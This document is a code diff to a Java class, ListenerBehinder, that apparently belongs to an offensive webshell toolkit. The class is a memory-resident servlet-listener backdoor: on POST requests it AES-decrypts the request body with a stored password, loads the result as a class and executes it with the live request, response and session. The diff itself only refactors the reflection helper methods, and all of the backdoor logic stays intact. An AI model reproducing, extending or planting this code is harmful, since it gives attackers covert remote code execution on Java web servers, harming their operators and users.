@@ -34,25 +34,25 @@ public class ListenerBehinder implements InvocationHandler {
 
     private void run(Object sre) {
         try {
-            Object request = invokeMethod(sre.getClass(), sre, "getServletRequest", new Class[]{}, new Object[]{});
+            Object request = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
             Object response = getResponse(request);
 
-            String method = (String) invokeMethod(request.getClass(), request, "getMethod", new Class[]{}, new Object[]{});
+            String method = (String) invokeMethod(request, "getMethod", new Class[]{}, new Object[]{});
             if (!method.equalsIgnoreCase("POST"))
                 return;
 
-            Object session = invokeMethod(request.getClass().getSuperclass(), request, "getSession", new Class[]{}, new Object[]{});
+            Object session = invokeMethod(request, "getSession", new Class[]{}, new Object[]{});
             Map<String, Object> pageContext = new HashMap<String, Object>();
             pageContext.put("session", session);
             pageContext.put("request", request);
             pageContext.put("response", response);
-            invokeMethod(session.getClass(), session, "putValue", new Class[]{String.class, Object.class}, new Object[]{"u", pass});
+            invokeMethod(session, "putValue", new Class[]{String.class, Object.class}, new Object[]{"u", pass});
 
             Object c = invokeMethod(Class.forName("javax.crypto.Cipher"), null, "getInstance", new Class[]{String.class}, new Object[]{"AES"});
-            invokeMethod(c.getClass(), c, "init", new Class[]{int.class, Class.forName("java.security.Key")}, new Object[]{2, Class.forName("javax.crypto.spec.SecretKeySpec").getDeclaredConstructor(byte[].class, String.class).newInstance(pass.getBytes(), "AES")});
-            Object reader = invokeMethod(request.getClass(), request, "getReader", new Class[]{}, new Object[]{});
-            String str = (String) invokeMethod(reader.getClass(), reader, "readLine", new Class[]{}, new Object[]{});
-            byte[] bytes = (byte[]) invokeMethod(c.getClass(), c, "doFinal", new Class[]{byte[].class}, new Object[]{base64(str)});
+            invokeMethod(c, "init", new Class[]{int.class, Class.forName("java.security.Key")}, new Object[]{2, Class.forName("javax.crypto.spec.SecretKeySpec").getDeclaredConstructor(byte[].class, String.class).newInstance(pass.getBytes(), "AES")});
+            Object reader = invokeMethod(request, "getReader", new Class[]{}, new Object[]{});
+            String str = (String) invokeMethod(reader, "readLine", new Class[]{}, new Object[]{});
+            byte[] bytes = (byte[]) invokeMethod(c, "doFinal", new Class[]{byte[].class}, new Object[]{base64(str)});
 
             Class clazz = defClass(bytes);
             clazz.newInstance().equals(pageContext);
@@ -93,6 +93,14 @@ public class ListenerBehinder implements InvocationHandler {
                 field = getField(clazz.getSuperclass(), fieldName);
         }
         return field;
+    }
+
+    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        try {
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        }catch (Exception e){
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
+        }
     }
 
     public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
